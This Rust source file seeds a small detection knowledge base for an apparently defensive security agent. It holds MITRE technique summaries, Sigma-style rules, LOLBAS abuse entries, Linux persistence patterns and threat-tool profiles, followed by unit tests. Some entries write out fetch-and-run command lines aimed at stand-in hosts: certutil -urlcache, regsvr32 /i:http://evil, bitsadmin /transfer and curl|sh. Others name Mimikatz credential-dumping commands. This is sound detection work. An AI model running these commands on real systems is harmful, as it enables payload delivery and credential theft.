//! Curated knowledge-base seed (Sub-tappa 6.7).
//!
//! 30 hand-picked documents the agent uses as RAG context. The
//! corpus is intentionally small and deliberate: every entry covers
//! a behaviour the model is likely to misclassify on its own
//! because the relevant tooling, technique, or IoC moved after the
//! base model's knowledge cutoff.
//!
//! Distribution (matches Sub-tappa 6.7 spec):
//!
//! | Category          | Count |
//! |-------------------|-------|
//! | MITRE technique   | 10    |
//! | Sigma rule        |  5    |
//! | LOLBAS            |  5    |
//! | Linux pattern     |  5    |
//! | Threat tool       |  5    |
//! | **Total**         | **30**|
//!
//! Future Sub-tappa 6.7+: replace this hardcoded list with an
//! ingestion pipeline that pulls from MITRE GitHub, Sigma project,
//! and LOLBAS, with optional curator review.

use common::rag_types::{KbCategory, KbDocument};

/// Build the full curated KB.
///
/// Returns owned documents so the caller can move them into the
/// store without retaining a borrow on the seed module.
pub fn seed_documents() -> Vec<KbDocument> {
    let mut out = Vec::with_capacity(30);
    out.extend(mitre_techniques());
    out.extend(sigma_rules());
    out.extend(lolbas_entries());
    out.extend(linux_patterns());
    out.extend(threat_tools());
    out
}

fn d(id: &str, category: KbCategory, title: &str, content: &str, tags: &[&str]) -> KbDocument {
    KbDocument {
        id: id.into(),
        category,
        title: title.into(),
        content: content.into(),
        tags: tags.iter().map(|t| (*t).into()).collect(),
    }
}

fn mitre_techniques() -> Vec<KbDocument> {
    vec![
        d(
            "mitre_t1059_001",
            KbCategory::MitreTechnique,
            "T1059.001: Command and Scripting Interpreter — PowerShell",
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in Windows. Common indicators: powershell.exe with -enc base64 args, EncodedCommand parameter, IEX (Invoke-Expression) downloading from URL, suspicious child of word/excel/outlook processes. Tactic: Execution (TA0002). Common malware: Cobalt Strike Beacon, Emotet, TrickBot.",
            &["powershell", "execution", "lolbin"],
        ),
        d(
            "mitre_t1547_001",
            KbCategory::MitreTechnique,
            "T1547.001: Boot or Logon Autostart Execution — Registry Run Keys",
            "Adversaries achieve persistence by adding programs to startup folders or referencing them with Registry run keys (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run). Common indicators: regedit creating Run/RunOnce entries, schtasks.exe creating triggers at logon, processes spawning at user logon from non-system paths. Tactic: Persistence (TA0003).",
            &["persistence", "registry", "windows"],
        ),
        d(
            "mitre_t1036",
            KbCategory::MitreTechnique,
            "T1036: Masquerading",
            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign. Common forms include renaming malicious binaries to match common system processes (svchost.exe, lsass.exe, systemd, kthreadd), placing binaries in trusted directories, and abusing right-to-left override unicode characters. Tactic: Defense Evasion (TA0005).",
            &["masquerading", "defense_evasion", "naming"],
        ),
        d(
            "mitre_t1496",
            KbCategory::MitreTechnique,
            "T1496: Resource Hijacking — Cryptomining",
            "Adversaries may leverage compromised resources to solve resource-intensive problems, most often by running unauthorised cryptocurrency miners. Indicators: high sustained CPU usage by an unrecognised process, network connections to mining pools (port 3333, 5555, 7777, 14444, 14433), miner-family process names (xmrig, ethminer, t-rex, claymore, nbminer). Tactic: Impact (TA0040).",
            &["cryptominer", "impact", "resource_abuse"],
        ),
        d(
            "mitre_t1486",
            KbCategory::MitreTechnique,
            "T1486: Data Encrypted for Impact — Ransomware",
            "Adversaries may encrypt data on target systems to interrupt availability and extort the victim. Indicators: rapid file rename storms with extensions like .lockbit / .conti / .alphv / .royal, deletion of Volume Shadow Copies (vssadmin delete shadows), creation of ransom notes (README*.txt, RECOVER-FILES.html), high disk write throughput by a single PID. Tactic: Impact (TA0040).",
            &["ransomware", "impact", "encryption"],
        ),
        d(
            "mitre_t1071_001",
            KbCategory::MitreTechnique,
            "T1071.001: Application Layer Protocol — Web Protocols (C2)",
            "Adversaries may communicate using application layer protocols associated with web traffic to blend with normal HTTPS noise. Indicators: long-lived TLS connections to recently-registered domains, beacon-like timing patterns (jitter ±10%), self-signed certificates, suspicious User-Agent strings (e.g. Mozilla/5.0 (compatible; MSIE) for Cobalt Strike), POST bodies with high-entropy encoded payloads. Tactic: Command and Control (TA0011).",
            &["c2", "https", "beacon"],
        ),
        d(
            "mitre_t1055",
            KbCategory::MitreTechnique,
            "T1055: Process Injection",
            "Adversaries inject code into running processes to evade defences and elevate privileges. Common forms: classic CreateRemoteThread + LoadLibrary, process hollowing (NtUnmapViewOfSection + WriteProcessMemory), reflective DLL loading, APC injection, on Linux ptrace(PTRACE_ATTACH) + memory write. Indicators: unexplained child threads in svchost/explorer/rundll32, ptrace syscalls from non-debugger processes. Tactic: Defense Evasion (TA0005).",
            &["process_injection", "defense_evasion"],
        ),
        d(
            "mitre_t1003_001",
            KbCategory::MitreTechnique,
            "T1003.001: OS Credential Dumping — LSASS Memory",
            "Adversaries dump LSASS process memory to extract credential material (NTLM hashes, Kerberos tickets, plaintext passwords). Indicators: any process opening lsass.exe with PROCESS_VM_READ, taskmgr/procdump/comsvcs/rundll32 dumping lsass to disk (.dmp files in temp paths), Mimikatz signatures in memory, suspicious access mask 0x1010 (DUP_HANDLE | READ) from a non-system process. Tactic: Credential Access (TA0006).",
            &["lsass", "credential_access", "mimikatz"],
        ),
        d(
            "mitre_t1082",
            KbCategory::MitreTechnique,
            "T1082: System Information Discovery",
            "Adversaries enumerate the host to fingerprint OS version, hardware, installed software and domain membership. Indicators: bursts of systeminfo / wmic / hostname / uname -a / cat /etc/os-release / lscpu run by an unusual user or in unusual order, often immediately after initial access. Dual-use legitimate tooling makes this MEDIUM-confidence on its own. Tactic: Discovery (TA0007).",
            &["discovery", "enumeration"],
        ),
        d(
            "mitre_t1190",
            KbCategory::MitreTechnique,
            "T1190: Exploit Public-Facing Application",
            "Adversaries exploit weaknesses in internet-facing applications (web servers, VPN gateways, mail servers) to gain initial access. Indicators: web server processes spawning shells (php-fpm → bash, nginx → /bin/sh, java → /bin/sh), exploitation of known CVEs in Confluence / Exchange / Citrix / Fortinet, anomalous POST bodies, webshell drops to webroot. Tactic: Initial Access (TA0001).",
            &["initial_access", "webshell", "exploitation"],
        ),
    ]
}

fn sigma_rules() -> Vec<KbDocument> {
    vec![
        d(
            "sigma_xmrig_detection",
            KbCategory::SigmaRule,
            "Sigma: Cryptominer Process Names",
            "Detection: process_creation where Image (or comm) contains one of: xmrig, xmrig-cuda, xmrig-amd, ethminer, t-rex, claymore, nbminer, nicehash, lolMiner, srbminer. Severity: high. False positives: legitimate test environments running mining benchmarks. Mapped tactic: Impact (T1496). Author note: confidence is high when combined with sustained CPU > 80%.",
            &["cryptominer", "impact", "detection"],
        ),
        d(
            "sigma_powershell_encoded",
            KbCategory::SigmaRule,
            "Sigma: Suspicious PowerShell Encoded Command",
            "Detection: process_creation where Image endswith powershell.exe AND CommandLine contains any of: -enc, -EncodedCommand, -ec ' ', from non-interactive parent (winword, excel, outlook, mshta, wscript). Severity: high. Mapped to T1059.001. False positives: legitimate admin scripts using -EncodedCommand for embedded JSON.",
            &["powershell", "encoded", "execution"],
        ),
        d(
            "sigma_lolbas_rundll32",
            KbCategory::SigmaRule,
            "Sigma: Suspicious rundll32 Execution",
            "Detection: process_creation where Image endswith rundll32.exe AND any of: CommandLine contains javascript:, CommandLine contains 'http' / 'https' (URL load), parent_image is winword/excel/outlook, no DLL path provided. Severity: high. Mapped to T1218.011. False positives: legitimate ActiveSetup, IE-based admin tools.",
            &["rundll32", "lolbin", "defense_evasion"],
        ),
        d(
            "sigma_suspicious_scheduled_task",
            KbCategory::SigmaRule,
            "Sigma: Suspicious Scheduled Task Creation",
            "Detection: process_creation where Image endswith schtasks.exe AND CommandLine contains /create AND any of: /ru SYSTEM, /sc onlogon, points to a binary in %TEMP% / %APPDATA% / %ProgramData%. Severity: medium-to-high. Mapped to T1053.005. False positives: software installers; correlate with parent process trustworthiness.",
            &["scheduled_task", "persistence"],
        ),
        d(
            "sigma_mimikatz_process",
            KbCategory::SigmaRule,
            "Sigma: Mimikatz-Like Process Indicators",
            "Detection: any process where any of: Image basename matches mimikatz / mimilib / mimidrv / kekeo / sekurlsa, on-disk hash matches known Mimikatz family, command line contains 'sekurlsa::logonpasswords' / 'lsadump::sam' / 'kerberos::golden'. Severity: critical. Mapped to T1003.001 + T1558. False positives: red-team engagements with prior approval.",
            &["mimikatz", "credential_access"],
        ),
    ]
}

fn lolbas_entries() -> Vec<KbDocument> {
    vec![
        d(
            "lolbas_certutil",
            KbCategory::Lolbas,
            "LOLBAS: certutil.exe abuse",
            "certutil.exe is a legitimate Windows binary for certificate management. Adversaries abuse it to download files (certutil -urlcache -split -f http://malicious.com/payload), decode base64 (certutil -decode in.txt out.exe), and bypass AV. Indicators: certutil.exe with -urlcache, -decode, -encode flags, certutil with HTTP/HTTPS URL in args. Tactic: Defense Evasion / Ingress Tool Transfer (T1105).",
            &["lolbin", "windows", "download"],
        ),
        d(
            "lolbas_regsvr32",
            KbCategory::Lolbas,
            "LOLBAS: regsvr32.exe abuse (Squiblydoo)",
            "regsvr32.exe registers DLLs but accepts a remote scriptlet via the /i argument: regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll. This bypasses application allowlisting and is widely abused (\"Squiblydoo\"). Indicators: regsvr32 with /i:http URL, regsvr32 child of office processes, regsvr32 with .sct or scrobj.dll references. Mapped to T1218.010.",
            &["lolbin", "windows", "regsvr32"],
        ),
        d(
            "lolbas_mshta",
            KbCategory::Lolbas,
            "LOLBAS: mshta.exe abuse",
            "mshta.exe executes Microsoft HTML Application files and is commonly abused to run inline VBScript/JScript: mshta.exe vbscript:CreateObject(...). Indicators: mshta.exe with vbscript: or javascript: prefix in args, mshta loading remote .hta files (HTTP/HTTPS), mshta as child of winword/excel/outlook. Mapped to T1218.005.",
            &["lolbin", "windows", "mshta"],
        ),
        d(
            "lolbas_rundll32",
            KbCategory::Lolbas,
            "LOLBAS: rundll32.exe abuse",
            "rundll32.exe runs an exported function from a DLL but accepts URL-loaded scriptlets via mshtml,RunHTMLApplication and the javascript: protocol. Indicators: rundll32 with javascript:..\\..\\mshtml..., rundll32 with no DLL path (proxy execution), rundll32 spawned by office macros. Mapped to T1218.011.",
            &["lolbin", "windows", "rundll32"],
        ),
        d(
            "lolbas_bitsadmin",
            KbCategory::Lolbas,
            "LOLBAS: bitsadmin.exe abuse",
            "bitsadmin.exe schedules background file transfers using the BITS service. Adversaries use it for stealthy ingress: bitsadmin /transfer evil http://evil/payload C:\\ProgramData\\p.exe. Indicators: bitsadmin /transfer or /addfile referencing HTTP URLs, BITS jobs created by non-admin tools. Mapped to T1197 + T1105.",
            &["lolbin", "windows", "bitsadmin"],
        ),
    ]
}

fn linux_patterns() -> Vec<KbDocument> {
    vec![
        d(
            "linux_susp_tmp_exec",
            KbCategory::LinuxPattern,
            "Linux: Execution from /tmp/, /dev/shm/, /var/tmp/",
            "Execution of binaries from world-writable temporary directories (/tmp, /dev/shm, /var/tmp) is a common indicator of post-exploitation activity. Legitimate software rarely executes from these paths. Common patterns: dropper downloads to /tmp + chmod +x + execve, /dev/shm used for fileless persistence, /var/tmp for delayed execution. MITRE: T1059, T1543.",
            &["linux", "execution", "tmp"],
        ),
        d(
            "linux_hidden_home_binary",
            KbCategory::LinuxPattern,
            "Linux: Hidden binary inside user home",
            "Binaries living in dot-prefixed directories under $HOME (e.g. ~/.cache/.x, ~/.config/.systemd/, ~/.local/share/.k) are a strong post-exploitation IoC. Attackers favour hidden subpaths for persistence implants and miner droppers because they survive cron-based cleanup of /tmp and bypass casual `ls`. MITRE: T1547, T1564.001.",
            &["linux", "persistence", "hidden"],
        ),
        d(
            "linux_root_from_user_path",
            KbCategory::LinuxPattern,
            "Linux: root-owned process running from user-writable path",
            "Process running as uid=0 whose binary path resolves under a user-writable location (under /home/$USER, /tmp, /var/tmp) is almost always the result of a privilege-escalation chain or a SUID-misuse exploit. Legitimate root daemons live under /usr/sbin, /usr/bin, /sbin, /bin, /opt/<vendor>. MITRE: T1068.",
            &["linux", "privilege_escalation"],
        ),
        d(
            "linux_webroot_binary",
            KbCategory::LinuxPattern,
            "Linux: New executable inside webroot",
            "An ELF binary appearing under a web server's docroot (/var/www, /usr/share/nginx/html, /opt/tomcat/webapps) is a strong webshell/dropper indicator. Pair with: file written by web-server uid (www-data, apache, nginx), parent of execve is php-fpm / java / nginx. MITRE: T1505.003.",
            &["linux", "webshell", "initial_access"],
        ),
        d(
            "linux_susp_cron",
            KbCategory::LinuxPattern,
            "Linux: Suspicious cron-installed persistence",
            "Cron entries that point at binaries inside user-writable paths, fetch a script over HTTP at execution time (curl|sh / wget -O- |sh), or run with @reboot frequency from a non-root crontab are common Linux persistence implants. Inspect /etc/cron.d/, /etc/crontab, /var/spool/cron/crontabs/. MITRE: T1053.003.",
            &["linux", "persistence", "cron"],
        ),
    ]
}

fn threat_tools() -> Vec<KbDocument> {
    vec![
        d(
            "tool_cobaltstrike",
            KbCategory::ThreatTool,
            "Cobalt Strike: red team framework weaponized by threat actors",
            "Cobalt Strike is a commercial adversary-simulation framework heavily abused by threat actors (APT groups, ransomware gangs). Beacon is the C2 implant. Indicators: PowerShell with specific user-agents (Mozilla/5.0 (compatible; MSIE)), HTTPS C2 with self-signed certificates, named-pipe SMB persistence, process hollowing into rundll32/svchost, beacon process names like `cobaltstrike-beacon`, `beacon.exe`, `artifact.exe`. Used by: Conti, LockBit, ALPHV, APT29, FIN6.",
            &["c2", "tool", "post_exploitation"],
        ),
        d(
            "tool_mimikatz",
            KbCategory::ThreatTool,
            "Mimikatz: Windows credential extraction",
            "Mimikatz is the canonical Windows credential dumper. Extracts plaintext passwords, NTLM hashes, Kerberos tickets and golden-ticket material from LSASS memory. Indicators: process / module named mimikatz / mimilib / mimidrv / kekeo / sekurlsa, command-line tokens 'sekurlsa::logonpasswords', 'lsadump::sam', 'kerberos::golden', any process opening lsass.exe with VM_READ. Embedded inside many post-exploitation frameworks (Cobalt Strike, Empire, Metasploit). MITRE: T1003.001 + T1558.",
            &["credential_access", "tool", "lsass"],
        ),
        d(
            "tool_bloodhound",
            KbCategory::ThreatTool,
            "BloodHound / SharpHound: AD attack-path discovery",
            "BloodHound visualises Active Directory relationships; SharpHound is its data collector. Indicators: SharpHound.exe process, large LDAP queries from a non-admin host, .json output files (computers.json / users.json / groups.json) in user-writable paths, network bursts to domain controllers immediately after initial access. Dual-use (red-team / pen-test) but in unauthorised contexts strongly indicates intrusion. MITRE: T1018 + T1087.002.",
            &["discovery", "tool", "active_directory"],
        ),
        d(
            "tool_empire",
            KbCategory::ThreatTool,
            "PowerShell Empire / Starkiller: PowerShell post-exploitation",
            "Empire is a PowerShell- and Python-based post-exploitation framework. Indicators: PowerShell launchers with -NoP -W Hidden -Enc <base64> sequences typical of Empire stagers, REST C2 over HTTPS, agent processes spawned by office apps. Fork: Starkiller (web-UI front-end). Despite project sunset many forks are still active. MITRE: T1059.001 + T1071.001.",
            &["c2", "tool", "powershell"],
        ),
        d(
            "tool_meterpreter",
            KbCategory::ThreatTool,
            "Metasploit Meterpreter: in-memory C2 payload",
            "Meterpreter is the Metasploit Framework's flagship in-memory implant. Loads via reflective DLL injection, supports multiple transports (TCP, HTTPS, UDP), and ships staged + stageless variants. Indicators: process injection into innocuous Windows processes (notepad / explorer / svchost) followed by long-lived TCP/HTTPS sessions, `rev/tcp` listener fingerprints (port 4444 by default), self-signed-cert HTTPS to a fresh domain. MITRE: T1055 + T1071.",
            &["c2", "tool", "metasploit"],
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    #[test]
    fn kb_seed_count_in_target_range() {
        let n = seed_documents().len();
        assert!((28..=32).contains(&n), "expected 28..=32 docs, got {n}");
    }

    #[test]
    fn kb_seed_ids_are_unique() {
        let docs = seed_documents();
        let mut seen = HashSet::new();
        for d in &docs {
            assert!(seen.insert(d.id.clone()), "duplicate id: {}", d.id);
        }
    }

    #[test]
    fn kb_seed_documents_have_non_empty_fields() {
        for d in seed_documents() {
            assert!(!d.id.is_empty(), "empty id");
            assert!(!d.title.is_empty(), "empty title for {}", d.id);
            assert!(
                d.content.len() > 50,
                "suspiciously short content for {} ({} chars)",
                d.id,
                d.content.len()
            );
            assert!(!d.tags.is_empty(), "empty tags for {}", d.id);
        }
    }

    #[test]
    fn kb_seed_distribution_matches_spec() {
        let docs = seed_documents();
        let count = |c: KbCategory| docs.iter().filter(|d| d.category == c).count();
        assert_eq!(count(KbCategory::MitreTechnique), 10);
        assert_eq!(count(KbCategory::SigmaRule), 5);
        assert_eq!(count(KbCategory::Lolbas), 5);
        assert_eq!(count(KbCategory::LinuxPattern), 5);
        assert_eq!(count(KbCategory::ThreatTool), 5);
    }
}
